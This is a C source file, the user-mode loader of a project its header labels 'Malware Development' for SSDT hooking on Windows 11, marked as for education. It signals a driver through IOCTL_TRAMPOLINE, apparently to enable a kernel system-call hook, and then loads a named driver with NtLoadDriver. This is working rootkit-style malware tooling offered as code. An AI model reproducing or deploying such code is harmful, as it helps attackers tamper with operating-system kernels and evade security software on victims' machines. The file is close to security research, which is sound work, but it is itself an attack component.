/*
╔═════════════════════════════════════════════════════════════╗
║                                                             ║
║                 ⚠️  Malware Development  ⚠️                   ║
║                                                             ║
║  @author: bekoo                                             ║
║  @website : 0xbekoo.github.io                               ║
║  @warning : This project has been developed                 ║
║              for educational purposes only.                 ║
║                                                             ║
║  @project: SSDT Hooking - UserMode Program                  ║
║  @platform: Windows 11 24H2 (Build: 26100.3194)             ║
║                                                             ║
╚═════════════════════════════════════════════════════════════╝
*/

#include "main.h"

int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("Usage: %s <DriverName>\n", argv[0]);
		return EXIT_FAILURE;
	}
	WCHAR DriverName[MAX_PATH] = { 0 };
	NtLoadDriver _NtLoadDriver;
	RtlAppendUnicodeToString _RtlAppendUnicodeToString;
	HANDLE HandleDevice = NULL;
	HMODULE NTDLL = NULL;
	UNICODE_STRING DriverServiceName;
	DWORD OutputBytesReturned = 0;
	BOOL Result = 0;
	DWORD dwExitCode = EXIT_SUCCESS;
	NTSTATUS Status = 0;

	MultiByteToWideChar(CP_ACP, 0, argv[1], -1, DriverName, MAX_PATH);

	NTDLL = GetModuleHandleA("ntdll.dll");
	if (NULL == NTDLL) {
		printf("Failed to get address of NTDLL!\n");

		dwExitCode = EXIT_FAILURE;
		goto Exit;
	}
	printf("NTDLL: 0x%p\n", NTDLL);

	/* Combine DriverName and ServiceName */
	RtlInitUnicodeString(&DriverServiceName, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
	WCHAR ServicePath[] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\";
	size_t ServicePathLength = wcslen(ServicePath);
	size_t DriverNameLength = wcslen(DriverName);
	size_t TotalLength = ServicePathLength + DriverNameLength + 1; // +1 for null terminator

	_RtlAppendUnicodeToString = (RtlAppendUnicodeToString)GetProcAddress(NTDLL, "RtlAppendUnicodeToString");
	if (NULL == _RtlAppendUnicodeToString) {
		printf("Failed to get address of RtlAppendUnicodeToString!\n");
		dwExitCode = EXIT_FAILURE;
		goto Exit;
	}

	// Allocate sufficient buffer for DriverServiceName
	DriverServiceName.Buffer = (PWCH)malloc(TotalLength * sizeof(WCHAR));
	if (NULL == DriverServiceName.Buffer) {
		printf("Failed to allocate memory for DriverServiceName!\n");
		return EXIT_FAILURE;
	}
	wcscpy_s(DriverServiceName.Buffer, TotalLength, ServicePath);
	DriverServiceName.Length = (USHORT)(ServicePathLength * sizeof(WCHAR));
	DriverServiceName.MaximumLength = (USHORT)(TotalLength * sizeof(WCHAR));

	Status = _RtlAppendUnicodeToString(&DriverServiceName, DriverName);
	if (0 != Status) {
		printf("Failed to append DriverName to ServiceName! Error Code: 0x%08x\n", Status);
		
		dwExitCode = EXIT_FAILURE;
		goto Exit;
	}
	printf("Full Path: %ws\n", DriverServiceName.Buffer);

	HandleDevice = CreateFile(DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == HandleDevice) {
		printf("Failed to connect Driver! Error Code: 0x%lx\n", GetLastError());

		dwExitCode = EXIT_FAILURE;
		goto Exit;
	}

	BOOLEAN bValue = TRUE;
	Result = DeviceIoControl(HandleDevice, IOCTL_TRAMPOLINE, &bValue, sizeof(bValue), NULL, 0, &OutputBytesReturned, NULL);
	if (!Result) {
		printf("Failed to IOCTL Code!\n");

		dwExitCode = EXIT_FAILURE;
		goto Exit;
	}

	_NtLoadDriver = (NtLoadDriver)GetProcAddress(NTDLL, "NtLoadDriver");
	if (NULL == _NtLoadDriver) {
		printf("Failed to get address of NtLoadDriver!\n");

		dwExitCode = EXIT_FAILURE;
		goto Exit;
	}
	printf("NtLoadDriver: 0x%p\n", _NtLoadDriver);

	Status = _NtLoadDriver(&DriverServiceName);
	if (0 != Status) {
		if (0xc000010e == Status) {
			/* 0xc000010e == STATUS_IMAGE_ALREADY_LOADED */
			printf("The driver is already loaded\n");

			dwExitCode = EXIT_SUCCESS;
			goto Exit;
		}
		printf("Failed to Load Driver! Error Code: 0x%08x\n", Status);

		dwExitCode = EXIT_FAILURE;
		goto Exit;
	}
	printf("The driver was installed successfully\n");
	dwExitCode = EXIT_SUCCESS;

Exit:
	if (NTDLL) {
		FreeLibrary(NTDLL);
	}
	if (HandleDevice) {
		CloseHandle(HandleDevice);
	}
	free(DriverServiceName.Buffer);

	return dwExitCode;
}
